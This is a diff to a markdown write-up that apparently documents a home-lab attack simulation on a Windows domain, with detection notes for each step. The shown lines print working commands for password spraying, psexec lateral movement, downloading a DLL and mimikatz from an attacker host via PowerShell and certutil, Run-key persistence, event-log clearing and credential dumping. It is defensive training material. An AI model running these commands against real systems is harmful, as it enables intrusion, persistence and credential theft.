@@ -30,7 +30,7 @@ I sprayed a candidate password list against a known domain user account, `ibrahi
 
 **Result:** `mydfir\ibrahim:P@ssw0rd` — flagged `(Pwn3d!)`, confirming local admin rights on the target.
 
-!image.png
+![NetExec Credential Spraying](Screenshots/1-image.png)
 
 **Artifacts this generates on the target:**
 
@@ -51,7 +51,7 @@ I sprayed a candidate password list against a known domain user account, `ibrahi
 impacket-psexec 'mydfir.local/ibrahim:P@ssw0rd@192.168.7.138' cmd.exe
 ```
 
-!image.png
+![Impacket PSExec Lateral Movement](Screenshots/2-image.png)
 
 **What this actually does, step by step:**
 
@@ -108,13 +108,13 @@ systeminfo
 
 **Source:** Python HTTP server on my attacker box (`192.168.7.250`) | **File dropped:** `dghelper.dll` → `C:\Windows\System32`
 
-!image.png
+![Attacker Python HTTP Server](Screenshots/3-image.png)
 
 ```powershell
 powershell -c Invoke-WebRequest -Uri http://192.168.7.250/dghelper.dll -OutFile C:\Windows\System32\dghelper.dll
 ```
 
-!image.png
+![PowerShell Invoke-WebRequest](Screenshots/4-image.png)
 
 **Why `System32`:** High binary density makes it a deliberately chosen blind spot — harder for a defender to spot one rogue DLL among hundreds of legitimate ones at a glance.
 
@@ -138,7 +138,7 @@ powershell -c Invoke-WebRequest -Uri http://192.168.7.250/dghelper.dll -OutFile 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "rundll32.exe C:\Windows\System32\dghelper.dll,mainfunc" /f
 ```
 
-!image.png
+![Registry Run Key Persistence](Screenshots/5-image.png)
 
 **Effect:** On every user logon, `rundll32.exe` loads `dghelper.dll` and calls its exported function `mainfunc`. Since `rundll32.exe` is a trusted, signed Microsoft binary, this blends into normal system activity rather than tripping binary-reputation-based detections.
 
@@ -162,7 +162,7 @@ wevtutil cl System
 wevtutil cl Application
 ```
 
-!image.png
+![Clearing Windows Event Logs](Screenshots/6-image.png)
 
 **Why this is largely ineffective against a centralized SIEM:** Clearing local logs does nothing to events already forwarded in real time to Splunk. To actually suppress collection, the attacker would need to kill the forwarder agent itself — a separate, independently detectable action. Additionally, the Windows Event Log service writes a dedicated event **immediately before** the target log is cleared, so the clearing action documents itself.
 
@@ -185,9 +185,9 @@ wevtutil cl Application
 certutil -urlcache -split -f http://192.168.7.250/mimikatz.exe C:\Windows\System32\mimi.exe
 ```
 
-!image.png
+![CertUtil Download Execution](Screenshots/7-image.png)
 
-!image.png
+![CertUtil Download Execution](Screenshots/7-image.png)
 
 CertUtil is a certificate management utility being abused here purely as a download mechanism. One behavioral fingerprint I confirmed in my own web server logs: CertUtil's `-urlcache` mechanism generates **two HTTP requests** to the source URL for a single download — a distinguishing signature independent of file name or destination path.
 
@@ -201,7 +201,7 @@ lsadump::secrets
 sekurlsa::logonpasswords
 ```
 
-!image.png
+![Mimikatz Credential Harvesting](Screenshots/9-image.png)
 
 - `privilege::debug` — requests `SeDebugPrivilege` to access protected LSASS memory
 - `lsadump::sam` — dumps local NTLM hashes from the SAM database
@@ -223,7 +223,7 @@ sekurlsa::logonpasswords
 impacket-secretsdump mydfir.local/ibrahim:P@ssw0rd@192.168.7.138
 ```
 
-!image.png
+![Impacket SecretsDump](Screenshots/10-image.png)
 
 Run remotely from my attacker box — extracts SAM and LSA secrets over the network without requiring an interactive session on the target.
 
